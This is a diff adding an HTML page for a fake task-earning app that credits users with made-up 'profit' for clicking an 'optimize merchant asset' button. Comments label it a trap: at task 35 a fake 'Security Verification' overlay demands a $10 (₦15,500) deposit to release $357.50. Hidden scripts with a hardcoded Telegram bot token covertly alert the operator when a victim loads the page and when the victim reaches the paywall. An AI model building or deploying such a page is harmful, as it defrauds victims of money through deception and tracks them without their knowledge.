@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>AGMT | Terminal Node</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&family=JetBrains+Mono&display=swap" rel="stylesheet">
+    <style>
+        :root { --primary: #2563eb; --accent: #10b981; --bg: #020617; --card: #0f172a; --border: #1e293b; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; }
+        
+        body { 
+            background: var(--bg); 
+            color: white; 
+            display: flex; 
+            flex-direction: column; 
+            min-height: 100vh; 
+            overflow: hidden; 
+        }
+
+        /* Top Bar: Live Stats */
+        .header-stats { 
+            background: rgba(15, 23, 42, 0.8); 
+            backdrop-filter: blur(10px); 
+            padding: 20px; 
+            border-bottom: 1px solid var(--border); 
+            display: flex; 
+            justify-content: space-between; 
+            z-index: 100;
+        }
+        .stat-group { display: flex; flex-direction: column; }
+        .stat-label { font-size: 10px; color: #64748b; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; }
+        .stat-value { font-family: 'JetBrains Mono', monospace; font-size: 18px; font-weight: 800; color: var(--accent); }
+
+        /* Scanning Area */
+        .main-workspace { 
+            flex: 1; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            padding: 20px; 
+            position: relative;
+        }
+
+        .img-container { 
+            width: 100%; 
+            max-width: 320px; 
+            aspect-ratio: 1/1; 
+            background: #fff; 
+            border-radius: 35px; 
+            overflow: hidden; 
+            border: 4px solid var(--border); 
+            position: relative; 
+            box-shadow: 0 0 50px rgba(37, 99, 235, 0.15);
+        }
+
+        .img-container img { width: 100%; height: 100%; object-fit: cover; transition: 0.4s; }
+
+        /* The Laser Scanner Line */
+        .laser-line { 
+            position: absolute; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 3px; 
+            background: var(--primary); 
+            box-shadow: 0 0 15px var(--primary), 0 0 30px var(--primary); 
+            z-index: 10; 
+            display: none; 
+        }
+        @keyframes scanMove { 0% { top: 0%; } 100% { top: 100%; } }
+
+        /* Live Terminal Log */
+        .terminal-log { 
+            margin-top: 25px; 
+            font-family: 'JetBrains Mono', monospace; 
+            font-size: 11px; 
+            color: var(--accent); 
+            text-transform: uppercase; 
+            letter-spacing: 0.5px;
+            height: 20px;
+        }
+
+        /* Footer Controls */
+        .action-area { 
+            background: var(--card); 
+            padding: 30px 25px 40px; 
+            border-top: 1px solid var(--border); 
+            border-radius: 40px 40px 0 0; 
+            box-shadow: 0 -10px 40px rgba(0,0,0,0.5);
+        }
+
+        .btn-optimize { 
+            width: 100%; 
+            background: var(--primary); 
+            color: white; 
+            padding: 22px; 
+            border-radius: 22px; 
+            border: none; 
+            font-weight: 800; 
+            font-size: 16px; 
+            letter-spacing: 0.5px;
+            cursor: pointer; 
+            transition: 0.2s;
+            box-shadow: 0 10px 30px rgba(37, 99, 235, 0.3);
+        }
+        .btn-optimize:active { transform: scale(0.96); }
+        .btn-optimize:disabled { background: #1e293b; color: #475569; box-shadow: none; }
+
+        /* THE TRAP OVERLAY */
+        #paywall { 
+            display: none; 
+            position: fixed; 
+            inset: 0; 
+            background: rgba(2, 6, 23, 0.98); 
+            z-index: 1000; 
+            align-items: center; 
+            justify-content: center; 
+            padding: 25px; 
+        }
+        .paywall-card { 
+            background: white; 
+            color: #020617; 
+            padding: 40px 30px; 
+            border-radius: 40px; 
+            width: 100%; 
+            max-width: 360px; 
+            text-align: center; 
+            animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        @keyframes popIn { from { opacity: 0; transform: scale(0.8); } to { opacity: 1; transform: scale(1); } }
+    </style>
+</head>
+<body>
+
+    <div class="header-stats">
+        <div class="stat-group">
+            <span class="stat-label">System Progress</span>
+            <div class="stat-value" id="task-counter">1 / 40</div>
+        </div>
+        <div class="stat-group" style="text-align: right;">
+            <span class="stat-label">Accrued Profit</span>
+            <div class="stat-value" id="earnings-display">$0.00</div>
+        </div>
+    </div>
+
+    <div class="main-workspace">
+        <div class="img-container">
+            <img src="assets/prod1.jpg" id="current-img">
+            <div class="laser-line" id="laser"></div>
+        </div>
+        <div class="terminal-log" id="log-text">SYSTEM READY...</div>
+    </div>
+
+    <div class="action-area">
+        <button class="btn-optimize" id="opt-btn" onclick="startOptimization()">
+            OPTIMIZE MERCHANT ASSET
+        </button>
+    </div>
+
+    <div id="paywall">
+        <div class="paywall-card">
+            <div style="font-size: 50px; margin-bottom: 20px;">🛡️</div>
+            <h2 style="font-weight: 800; margin-bottom: 12px; letter-spacing: -1px;">Security Verification</h2>
+            <p style="font-size: 14px; color: #475569; line-height: 1.6; margin-bottom: 30px;">
+                You have reached a <b>High-Value Liquidity Node</b>. A merchant verification deposit of <b>₦15,500 ($10)</b> is required to unlock the final batch and release your total earnings of $357.50.
+            </p>
+            <button class="btn-optimize" onclick="location.href='checkout.html'">PROCEED TO UNLOCK</button>
+            <p style="font-size: 11px; color: #94a3b8; margin-top: 20px;">*Deposit is automatically credited to your final withdrawal.</p>
+        </div>
+    </div>
+
+    <script>
+        const botToken = "8673029559:AAF4zFJC80TERVUMTvZ9ieSMWM0K-2vWGTI";
+        const chatId = "7909543900";
+
+        let currentStep = 1;
+        let totalEarnings = 0;
+
+        async function startOptimization() {
+            // THE TRAP AT TASK 35
+            if(currentStep >= 35) {
+                document.getElementById('paywall').style.display = 'flex';
+                // TELEGRAM ALERT
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=💸 <b>TARGET LOCKED:</b> User reached Task 35. Paywall shown!&parse_mode=html`);
+                return;
+            }
+
+            const btn = document.getElementById('opt-btn');
+            const laser = document.getElementById('laser');
+            const log = document.getElementById('log-text');
+            const img = document.getElementById('current-img');
+
+            // Start Animation
+            btn.disabled = true;
+            btn.innerText = "PROCESSING NODE...";
+            laser.style.display = "block";
+            laser.style.animation = "scanMove 1.5s infinite linear";
+            log.innerText = "> Syncing Merchant Ledger...";
+
+            // Wait 1.8 seconds (The "Work" feeling)
+            setTimeout(() => {
+                currentStep++;
+                totalEarnings += 4.50;
+
+                // Update Image
+                img.src = `assets/prod${currentStep}.jpg`;
+                
+                // Update UI
+                document.getElementById('task-counter').innerText = `${currentStep} / 40`;
+                document.getElementById('earnings-display').innerText = `$${totalEarnings.toFixed(2)}`;
+                
+                // Reset State
+                btn.disabled = false;
+                btn.innerText = "OPTIMIZE MERCHANT ASSET";
+                laser.style.display = "none";
+                log.innerText = "NODE OPTIMIZED SUCCESSFULLY";
+            }, 1800);
+        }
+
+        // Silent Monitor: Alert when they enter the engine
+        window.onload = function() {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=⚡ <b>ENGINE ACTIVE:</b> User has started optimizing tasks.&parse_mode=html`);
+        }
+    </script>
+</body>
+</html>
+
